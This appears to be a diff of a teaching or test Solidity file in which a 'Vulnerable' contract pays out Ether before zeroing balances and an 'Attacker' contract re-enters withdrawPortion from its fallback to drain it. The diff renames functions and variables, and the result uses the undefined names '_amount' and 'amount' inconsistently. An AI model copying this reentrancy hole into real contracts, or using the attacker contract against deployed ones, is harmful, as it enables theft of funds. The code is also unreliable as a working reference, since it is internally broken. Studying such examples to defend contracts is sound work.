@@ -9,19 +9,19 @@ contract Vulnerable{
      totalbalance += msg.value;
   } 
 
-  // Each recipient should only be able to claim the bonus once
+  // withdraw all the Ether
   function withdrawAll(address to) external {
-      uint256 amount = balances[msg.sender];
-      if (balances[msg.sender] > 0) {
+      uint256 amount = userBalances[msg.sender];
+      if (userBalances[msg.sender] > 0) {
         require(msg.sender.call.value(amount)());
         totalbalance -= _amount;
-    	  balances[msg.sender] = 0;
+    	userBalances[msg.sender] = 0;
       }
   }
   
-  // withdraw part the money
+  // withdraw part the Ether
   function withdrawPortion(uint _amount) external {   
-     if (balances[msg.sender] >= amount) {
+     if (userBalances[msg.sender] >= amount) {
         require(msg.sender.call.value(amount)());
         totalbalance -= _amount;
         userBalances[msg.sender] -= amount;
@@ -43,13 +43,13 @@ contract Attacker{
   }
 
   function attack(){
-    vul.getBonus(_owner);
+    vul.withdrawAll(_owner);
   }
 
   function () payable{
      count++;
      if(count < 10){
-       vul.withdraw(1 ether);
+       vul.withdrawPortion(1 ether);
      }
   }
 }
